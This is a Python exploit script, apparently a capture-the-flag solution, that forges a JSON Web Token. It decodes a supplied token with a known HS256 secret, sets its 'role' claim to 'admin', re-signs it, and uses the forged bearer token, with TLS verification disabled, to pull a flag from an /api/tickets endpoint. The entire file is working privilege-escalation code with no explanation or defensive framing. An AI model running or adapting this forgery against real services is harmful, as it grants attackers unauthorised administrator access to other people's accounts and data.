#!/usr/bin/env python3
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import jwt
import json
import sys

def Forge_Token(jwt_token, secret):
    try:
        decoded_token = jwt.decode(jwt_token, secret, algorithms=["HS256"])
    except jwt.exceptions.InvalidTokenError as ite:
        print("[-] Error decoding JWT:", ite)
        return
    
    decoded_token["role"] = "admin"
    new_token = jwt.encode(decoded_token, secret, algorithm="HS256")
    print("[+] New token:", new_token + "\n")
    
    return new_token

def Main(url, username, password, token, secret):    
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    login_payload = {"username": username, "password": password}
    headers_ = {"Content-Type": "application/json"}
    
    print("[*] Logging in...")
    r1 = requests.post(url + "/api/auth/login", json=login_payload, headers=headers_, verify=False)
    print("[*] Login response status code:", r1.status_code)

    forged_token = Forge_Token(token, secret)
    if not forged_token:
        print("[!] Could not force token. Exiting...")
        return

    headers_b = {"Authorization": f"Bearer {forged_token}"}

    print("[+] Going for the flag...")
    r2 = requests.get(url + "/api/tickets", headers=headers_b, verify=False)
    print("[+] Flag:", r2.json()[0]["title"])
    return

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage:", sys.argv[0], "[username]:[password] [url] [jwt_token] [jwt_secret]")
        sys.exit()
    user, passwd = sys.argv[1].split(":")
    url = sys.argv[2].rstrip("/")
    token = sys.argv[3]
    secret = sys.argv[4]
    Main(url, user, passwd, token, secret)